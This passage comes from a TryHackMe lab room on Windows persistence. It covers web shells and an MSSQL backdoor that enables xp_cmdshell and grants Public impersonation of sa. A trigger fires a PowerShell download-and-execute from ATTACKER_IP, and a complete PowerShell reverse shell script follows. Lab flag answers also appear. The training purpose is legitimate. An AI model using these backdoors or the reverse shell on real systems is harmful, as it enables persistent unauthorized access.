<p><b>Note:</b> Depending on the way you create/transfer&nbsp;<code>shell.aspx</code>, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with <code>icacls shell.aspx /grant Everyone:F</code>.</p><p>We can then run commands from the web server by pointing to the following URL:</p>
<p><code>http://MACHINE_IP/shell.aspx</code></p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Windows Local Persistence_files/d9845057ebf54a61401ca61c2c268fe8.png" alt="web shell"></p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Use your web shell to execute <code>C:\flags\flag16.exe</code> to get your flag!</span>
        </div>
</div>
<p>While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.</p>

<p><span style="font-size:24px">Using MSSQL as a Backdoor</span></p>
<p>There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, <strong>triggers</strong> in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the <code>HRDB</code> database.</p>
<p>Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the <code>xp_cmdshell</code> stored procedure. <code>xp_cmdshell</code> is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.</p>
<p>To enable it, let's open <code>Microsoft SQL Server Management Studio 18</code>, available from the start menu. When asked for authentication, just use <strong>Windows Authentication</strong> (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.</p>
<p>Once logged in, click on the <b>New Query</b> button to open the query editor:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/eb3aaca1ed1da7d1e08f0c3069a5633a.png" alt="New SQL query"></p>
<p>Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable <code>xp_cmdshell</code>.</p>
<pre class=" language-sql" tabindex="0"><code class=" language-sql">sp_configure <span class="token string">'Show Advanced Options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
GO

sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
GO</code></pre>
<p>After this, we must ensure that any website accessing the database can run <code>xp_cmdshell</code>. By default, only database users with the <code>sysadmin</code> role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the <code>sa</code> user, which is the default database administrator:</p>
<pre class=" language-sql" tabindex="0"><code class=" language-sql"><span class="token keyword">USE</span> master

<span class="token keyword">GRANT</span> IMPERSONATE <span class="token keyword">ON</span> LOGIN::sa <span class="token keyword">to</span> <span class="token punctuation">[</span><span class="token keyword">Public</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>After all of this, we finally configure a trigger. We start by changing to the <code>HRDB</code> database:</p>

<pre class=" language-sql" tabindex="0"><code class=" language-sql"><span class="token keyword">USE</span> HRDB
</code></pre>

<p>Our trigger will leverage <code>xp_cmdshell</code> to execute Powershell to download and run a <code>.ps1</code> file from a web server controlled by the attacker. The trigger will be configured to execute whenever an&nbsp;<code>INSERT</code> is made into the <code>Employees</code> table of the <code>HRDB</code> database:</p>
<pre class=" language-sql" tabindex="0"><code class=" language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TRIGGER</span> <span class="token punctuation">[</span>sql_backdoor<span class="token punctuation">]</span>
<span class="token keyword">ON</span> HRDB<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Employees 
<span class="token keyword">FOR</span> <span class="token keyword">INSERT</span> <span class="token keyword">AS</span>

<span class="token keyword">EXECUTE</span> <span class="token keyword">AS</span> LOGIN <span class="token operator">=</span> <span class="token string">'sa'</span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"'</span><span class="token punctuation">;</span>
</code></pre>
<p>Now that the backdoor is set up, let's create <code>evilscript.ps1</code> in our attacker's machine, which will contain a Powershell reverse shell:</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token variable">$client</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token string">"ATTACKER_IP"</span><span class="token punctuation">,</span>4454<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token namespace">[byte[]]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">iex</span> <span class="token variable">$data</span> 2&gt;&amp;1 <span class="token punctuation">|</span> <span class="token function">Out-String</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">"PS "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">"&gt; "</span><span class="token punctuation">;</span>
    <span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>We will need to open two terminals to handle the connections involved in this exploit:</p>
<ul>
<li>The trigger will perform the first connection to download and execute <code>evilscript.ps1</code>. Our trigger is using port 8000 for that.</li>
<li>The second connection will be a reverse shell on port 4454 back to our attacker machine.</li>
</ul>
<table><tbody><tr>
<td style="width:50%">
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server </span></span>
<span class="token output"><span>Serving <a class="a8tubHIs glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;a8tubHIs&#39;)">HTTP</a> on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... </span></span></code>
        </pre>
    </div>
</div>
</td>
<td><span style="font-size:64px">&nbsp;</span></td>
<td style="width:50%">
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class="  language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4454</span></span></span>
<span class="token output">Listening on 0.0.0.0 4454
</span></code>
        </pre>
    </div>
</div>
</td>
</tr></tbody></table>
<p>With all that ready, let's navigate to <code>http://MACHINE_IP/</code> and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/362875749378007cc447a2e47d476c9b.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Use your web shell to execute <code>C:\flags\flag17.exe</code> to get your flag!</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Insert flag16 here
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{******************}" value="THM{EZ_WEB_PERSISTENCE}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag17 here<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{***********************}" value="THM{I_LIVE_IN_YOUR_DATABASE}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 9                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>In this room, we have covered the primary methods used by attackers to establish persistence on a machine. You could say persistence is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seen persistence methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.</p>
<p>While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:</p><ul>
<li><a href="https://www.hexacorn.com/blog/category/autostart-persistence/" target="_blank">Hexacorn - Windows Persistence</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md" target="_blank">PayloadsAllTheThings - Windows Persistence</a>&nbsp;<br></li>
<li><a href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/" target="_blank">Oddvar Moe - Windows Persistence Through RunOnceEx </a>&nbsp;</li>
<li><a href="https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank">PowerUpSQL</a>&nbsp;</li>
</ul>

</div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Click and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Windows Local Persistence_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Windows Local Persistence_files/6be6191826f2a6e5a154c13ad8f29d1e.png"> 
        <a class="green-link" href="https://tryhackme.com/p/munra">munra</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 10183 users are in here and this room is 363 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Windows Local Persistence_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Windows Local Persistence_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="nE2YsHvN-3eFfoZiusc6dJBunUEjaM7Xw5Hc">
<input type="hidden" name="roomCode" value="windowslocalpersistence">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Windows Local Persistence_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Windows Local Persistence_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Windows Local Persistence_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Windows Local Persistence_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/62d6c6f07fd7b47d81b08e75">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Windows Local Persistence_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/windowslocalpersistence#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/windowslocalpersistence#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
